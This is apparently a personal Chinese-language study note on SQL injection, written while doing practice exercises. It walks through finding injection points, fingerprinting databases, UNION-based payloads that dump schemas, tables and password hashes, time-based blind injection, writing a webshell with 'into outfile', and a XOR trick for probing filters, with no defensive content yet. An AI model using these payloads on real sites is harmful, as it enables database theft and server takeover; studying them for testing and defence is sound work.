---
title: SQL注入笔记
date: 2020-06-01 18:13:28
tags:
- 渗透测试
categories:
- 网络安全
---


# 一、Sql注入的本质理解

​	Sql注入的本质是利用网页中可控的注入点，动态构造后端的Sql语句，达到注入攻击的目的。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取想得到的资料。）  





# 二、Sql注入的一般步骤

1. 判断环境、寻找注入点、判断数据库类型。
2. 根据注入参数类型，在脑海中构造大致的Sql语句。

   * 数字型：`Select * from 表名 where id=1 and [查询条件]`  （注入参数为`id=1 and [查询条件]`）
   * 字符型：`select * from 表名 where class='a' and [查询条件] and ''=''`（注入参数为`class=a' and [查询条件] and ''='`）
   * 搜索型：SQL语句原貌大致为：`Select * from 表名 where 字段 like '%关键字%' ` ,生成语句可以是`Select * from 表名 where字段like '%' and [查询条件] and '%'='%'` （注入参数为`keyword=' and [查询条件] and '%25'='`）（语句中的 '%' 意为模糊查询，%25经URL解码后为 '%' ）
3. 猜解表名，列名，查找需要的数据。





# 三、Sql注入点的判断

## 常见注入点

* GET请求：在URL中发送参数。

* POST请求：数据被包含在请求体中。

* **其它类型的注入数据：例如HTTP请求头等**

  常见http可能被污染的参数:

  - User-agent 浏览器版本 （少）
  - Referer      来源（少）
  - X-Forwarded-For 获取ip（多）
  - client_ip   获取ip（多）
  - cookie      获取cookie值（多）



## 注入点判断方法

### 1.返回错误信息

**单引号判断法：** 

在参数后面加上单引号并观察。**如果页面返回错误，则存在 Sql 注入**，即存在可被我们控制的动态构造部分。 原因是**无论字符型还是整型都会因为单引号个数不匹配而报错**。出现单引号个数不匹配说明某部分后端代码用我们提供的多一个引号的参数动态构造后多出了一个引号。同时，这种方法在页面出现错误信息的时候也可以判断数据库类型。



*实例：*

> 在网站首页上，有名为“IE不能打开新窗口的多种解决方法”的链接，地址为：`http://www.mytest.com/showdetail.asp?id=49`，我们在这个地址后面加上单引号’，服务器返回下面的错误提示： 
>
> > Microsoft JET Database Engine 错误 '80040e14' 
> >
> > 字符串的语法错误 在查询表达式 'ID=49'' 中。 
> > /showdetail.asp，行8 
>
> 
>
>  **从这个错误提示我们能看出：** 
>
> * 网站使用的是Access数据库，通过JET引擎连接数据库，而不是通过ODBC。 //引擎及数据库信息
> * 程序没有判断客户端提交的数据是否符合程序要求。 //对注入的可能性的判断
> * 该SQL语句所查询的表中有一名为ID的字段。 //对字段的判断



### 2.不返回错误信息

上述的单引号判断法简便易用，但并不适用于所有的情况，具体解释如下：

> 1.不一定每台服务器的IIS都返回具体错误提示给客户端，如果程序中加了cint(参数)之类语句的话，Sql注入是不会成功的，但服务器同样会报错，具体提示信息为处理 URL 时服务器上出错。请和系统管理员联络。 
> 2.部分对Sql注入有一点了解的程序员，认为只要把单引号过滤掉就安全了，这种情况不为少数，如果你用单引号测试，是测不到注入点的，所以进一步的判断是有必要的。



此时一个经典的方法是**借助and和or来判断：**

* 数字型：当输入的参数 **x** 为**整型**时，通常 php 文件中 Sql 语句类型大致如下： `select * from <表名> where id = x` 。 这种类型可以先用 `and 1=1` 和 `and 1=2` 来做尝试：

  *实例：*

  > ① `http://www.mytest.com/showdetail.asp?id=49 `
  > ② `http://www.mytest.com/showdetail.asp?id=49 and 1=1`
  > ③ `http://www.mytest.com/showdetail.asp?id=49 and 1=2`
  >
  > 
  >
  > **可以注入的表现：** 
  > ① 正常显示
  > ② 正常显示，内容基本与①相同。
  >
  > 后台执行 Sql 语句大致为：
  >
  > ```mysql
  > select * from <表名> where id = x and 1=1 
  > ```
  >
  > 没有语法错误且逻辑判断为正确，所以返回正常。
  >
  > ③ 提示BOF或EOF（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了on error resume next） 
  >
  > 后台执行 Sql 语句大致为：
  >
  > ```
  > select * from <表名> where id = x and 1=2
  > ```
  >
  > 没有语法错误但是逻辑判断为假，所以返回错误。
  >
  > 
  >
  > **不可以注入的表现：**
  >
  > ①同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。

  或者我们也可以先把参数改为很大的数或负数，要让它查询不到数据，再在最后加上 or 1=1 就成功返回了数据，这是因为 1=1 为真，不管前面是不是假，数据都会返回。当 or 1=2 时，因为 1=2 为假，前后都为假，最终也是假，数据就不会返回了。

  

* 字符型：当输入的参数 **x 为字符型**时，通常 php 文件中 SQL 语句类型大致如下： `select * from <表名> where id = 'x'` 这种类型我们同样可以使用 `and '1'='1` 和 `and '1'='2`来判断：

  > ① URL 地址中输入 `http://xxx/abc.php?id= x' and '1'='1` 页面运行正常，继续进行下一步。
  >
  > ② URL 地址中输入 `http://xxx/abc.php?id= x' and '1'='2` 页面运行错误，则说明此 Sql 注入为字符型注入。

  

* 除此之外还有搜索型注入，等做到相关题目再行补充。



# 四、漏洞利用

## 一、数据库类型判断

#### 1 通过网站脚本类型判断

 - PHP -> Oracle、MySQL
- JSP -> Oracle、MySQL
 - ASP/.NET -> SQL Server

#### 2 通过错误信息判断

 - MySQL -> `error:You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version`
- Oracle -> `Microsoft OLE DB Provider for ODBC Drivers 错误`

 #### 3 通过数字函数判断

 - SQL Server -> `@@pack_received、@@rowcount`
- MySQL -> `connection_id()、last_insert_id() 、 row_count()`
 - Oracle -> `BITAND(1,1)`
 - PostgreSQL -> `select EXTRACT(DOW FROMNOW())`



### 二、通过UNION语句提取数据

> UNION 操作符可以合并两条或多条 SELECT 语句的查询结果，基本语法如下：
> `select column1 column2 from table1 UNION select column1 column2 from table2`

**使用UNION语句需要满足的条件：** 前后两个查询的列数及对应列的数据类型必须相等。



*一般过程为：*

#### 1. 获得列数

使用  `order by` 语句。最大且不报错的数值即为列数。



#### 2. 获得回显点

使用 `union select` 语句，查看回显点。

*使用例：* `?id=-1' union select 1,2,3 %23`

> 说明：
>
> 先查询一个**不存在的参数**，本应该返回空的；
> 但是使用UNION查询，会输出后面的查询；
> 用**数字去占位**，所以能看到的数字就是回显点。



#### 3. 猜解数据库

* 数据库版本信息：

  ```mysql
  ?id=' union select 1, version(), 3 %23
  ```

* 当前数据库和用户：

  ```mysql
  ?id=' union select 1, database(), user() %23
  ```

* 所有数据库：

  ```mysql
  ?id=' union select 1, (select group_concat(schema_name) from information_schema.schemata), 3 %23
  ```

* 表名：

  ```mysql
  ?id=' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='<当前数据库名称>'), 3 %23
  ```

* 列名：

  ```mysql
  ?id=' union select 1, (select group_concat(column_name) from information_schema.columns where table_schema='<当前数据库名称>' and table_name='<当前表名>'), 3 %23
  ```

* 字段值 ( 其中separator可选 ) ：

  ```mysql
  ?id=' union select 1,(select group_concat(<查询到的列名> separator ;) from <当前表名>), 3 %23
  ```



#### 4. 获取哈希口令

> 哈希口令是通过使用 PASSWORD() 函数计算的，具体算法取决于MySQL安装的版本。
> `select password('admin')`
> 也可以通过在线解密网站进行解密。如 [CMD5](http://www.cmd5.com/)



#### 5. 写入 Webshell

> 需要得到网站的绝对路径，数据库管理系统有向服务器文件系统写文件的权限。
> `?id=1' union select "" into outfile "D:\\XXX\\conn.php"%23`



#### 6. 盲注说明

**上述是用有回显注入举例说明Sql注入的基本过程的例子，盲注过程与此类似，例如用：**

`id=1 union select 1，if(SUBSTRING(user(),1,4)='root',sleep(5),1),3`（substring函数的作用是将user()从第一位字母到第四位字母截断。这段参数的注入逻辑是，user()的第一位到第四位如果为'root'，则页面等待5秒，否则结果为1。）



## 五、防御相关

### 1. 防御绕过

#### 异或注入

可用异或注入检测过滤的字符串。异或即两个条件同真或同假即为假，两条件一真一假则为真。

样例如下：

```
?id=1'^(length('and')!=0)--+
```

此样例可用来判断and是否被过滤。若满足异或条件则返回id=0对应的值，即被过滤。不满足异或条件则返回id=1对应的值，即未被过滤。也可以用`xor`来构造语句。

不过，有的时候需要使用 `=` 而不是 `!=` 来判断。例如，WAF过滤了or，那么order的length就为3，虽然不等于0，但是没有order的功能了。

### 2. 防御方法

​	目前还没什么概念，等以后再补。